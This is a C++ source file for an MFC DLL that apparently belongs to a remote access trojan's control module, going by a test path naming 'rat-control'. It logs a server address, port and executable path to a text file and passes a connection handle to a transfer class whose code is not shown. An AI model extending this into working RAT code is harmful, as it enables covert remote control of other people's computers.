// PcCortr.cpp : Defines the initialization routines for the DLL.
//

#include "stdafx.h"
#include "PcCortr.h"
#include ".\mymaintrans.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif

BEGIN_MESSAGE_MAP(CPcCortrApp, CWinApp)
	//{{AFX_MSG_MAP(CPcCortrApp)
		// NOTE - the ClassWizard will add and remove mapping macros here.
		//    DO NOT EDIT what you see in these blocks of generated code!
	//}}AFX_MSG_MAP
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CPcCortrApp construction

CPcCortrApp::CPcCortrApp()
{
	// TODO: add construction code here,
	// Place all significant initialization in InitInstance
}

/////////////////////////////////////////////////////////////////////////////
// The one and only CPcCortrApp object
static void WriteLog(char* message)
{
	FILE* fp = fopen("controldll.txt", "a");
	if (fp != NULL)
	{
		fwrite(message, strlen(message), 1, fp);
		fwrite("\n", 2, 1, fp);
		fclose(fp);
	}
}
CPcCortrApp theApp;
void ProcessTrans(HINTERNET hFp , HANDLE m_ExitEvent ,char* pServerAddr , 
				int   nServerPort ,	char* pRegInfo ,char* pFileName)
{

	// hfp:13369356  156 Addr 192.168.1.189 port 8080 REG ps filename: C:\Users\vm-test-rat-control\Desktop\Bin\Bin\ps.exe
	char message[256];
	sprintf(message, "hfp:%llu  %llu Addr %s port %d REG %s filename: %s",hFp,m_ExitEvent,pServerAddr,nServerPort,pRegInfo,pFileName);
	WriteLog(message);
	AFX_MANAGE_STATE(AfxGetStaticModuleState());
	CMyMainTrans m_Trans;
	m_Trans.DoWork(hFp,m_ExitEvent,pServerAddr,nServerPort,pRegInfo,pFileName);
}
